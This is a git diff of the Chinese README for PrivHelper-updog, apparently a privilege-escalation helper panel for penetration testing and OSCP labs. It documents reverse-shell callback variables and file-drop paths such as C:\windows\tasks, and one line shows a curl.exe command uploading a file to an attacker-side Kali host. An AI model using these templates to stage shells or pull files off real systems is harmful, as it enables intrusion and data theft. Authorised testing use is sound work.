@@ -1,4 +1,4 @@
-# PrivHelper-updog v1.1.0
+# PrivHelper-updog v1.2.0
 ## 简介
 
 作者：~~Ra's Al Ghul~~
@@ -11,7 +11,8 @@ PrivHelper 是一个面向渗透测试/OSCP场景的轻量级提权辅助面板�
 
 目前启动后的页面
 
-![image-20260326134509920](images/image-20260326134509920.png)
+<img width="2277" height="1132" alt="image" src="https://github.com/user-attachments/assets/740552af-6f87-4559-b837-1120e736a9b3" />
+
 
 ## 功能特性
 
@@ -140,8 +141,10 @@ copy hash.txt hashtmp.txt
 - `$badfile`：当前工具的文件名（不含路径），例如 `winPEASx64.exe`
 - `$callback_ip`：回连 IP（前端可改；默认等于 BADIP；若用户手动设置过则不再跟随 BADIP）
 - `$callback_port`：回连端口（前端可改；默认 4444）
-- `$toolpath`：当前工具所在目录的绝对路径（例如 `.../tools/windows/shell`）
-- `$toolfile`：当前工具文件的绝对路径（例如 `.../tools/windows/shell/shell80.exe`）
+- `$toolpath`：当前工具所在目录的绝对路径
+- `$toolfile`：当前工具文件的绝对路径
+- `$win_download_dir`：windows文件落地路径（例如 `C:\windows\tasks`）
+- `$linux_download_dir`：linux文件落地路径（例如 `/tmp`）
 
 推荐优先使用 `$downloadurl`，因为它不依赖你手动拼接路径，目录变动也不需要改命令模板。
 
@@ -339,7 +342,8 @@ curl.exe -v -F "file=@file.txt;filename=file.txt" -F "path=/home/kali/Desktop/up
 
 可能的原因有，ip替换的不对，可能是您上一次使用工具浏览器的缓存导致，可以清空一下缓存
 
-![image-20260403144106094](images/image-20260403144106094.png)
+<img width="2251" height="634" alt="image" src="https://github.com/user-attachments/assets/3b9a4e01-6f82-451c-bb66-db2fb8bbe65e" />
+
 
 还可能是目标不出网，或者端口受限，建议服务端口选用目标已经开放的端口
 
